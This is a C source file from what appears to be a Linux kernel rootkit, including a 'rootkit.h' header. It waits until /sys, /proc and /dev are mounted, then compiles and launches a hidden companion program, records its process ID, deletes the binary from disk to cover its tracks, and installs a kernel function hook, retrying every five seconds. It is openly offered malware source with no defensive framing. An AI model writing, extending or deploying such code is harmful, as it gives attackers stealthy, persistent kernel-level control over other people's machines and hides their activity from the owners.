#include "rootkit.h"


bool is_system_ready(void)
{
	struct path p;

	// Check if /sys is mounted
	// printk(KERN_INFO "Checking if /sys is mounted...\n");
	if (kern_path("/sys", 0, &p) == 0) {
		// Check if it's a directory (mount point)
		if (S_ISDIR(p.dentry->d_inode->i_mode)) {
			path_put(&p); // Release the path reference
			// printk(KERN_INFO "/sys is mounted\n");
		} else {
			path_put(&p);
			// printk(KERN_INFO "/sys is not mounted properly\n");
			return false;
		}
	} else {
		// printk(KERN_INFO "/sys is not available\n");
		return false;
	}

	// Check if /proc is mounted
	if (kern_path("/proc", 0, &p) == 0) {
		if (S_ISDIR(p.dentry->d_inode->i_mode)) {
			path_put(&p); // Release the path reference
		} else {
			path_put(&p);
			return false;
		}
	} else {
		return false;
	}

	// Check if /dev is mounted (i.e., the devtmpfs is ready)
	if (kern_path("/dev", 0, &p) == 0) {
		if (S_ISDIR(p.dentry->d_inode->i_mode)) {
			path_put(&p); // Release the path reference
		} else {
			path_put(&p);
			return false;
		}
	} else {
		return false;
	}

	// If we reach here, critical filesystems are mounted, the system is ready for userland applications

	// You can now perform other checks or launch userland applications.
	// For example, checking if the system is ready to compile or run applications.

	return true;
}

void delayed_module_init_work(struct work_struct *work)
{
	// Check if system is ready
	if (is_system_ready()) {
		compile_companion();
		launch_companion();
		get_pid_companion();
		delete_binary();

		// printk(KERN_INFO "pid %d\n", g_pid_companion);

		if (fh_install_hook(g_f_hook[0])) {
			// TODO
		}

		return;
	}

	// If not ready, requeue the work
	queue_delayed_work(g_delayed_init_wq,
		&g_delayed_init_work,
		msecs_to_jiffies(5000)); // 5-second interval
}


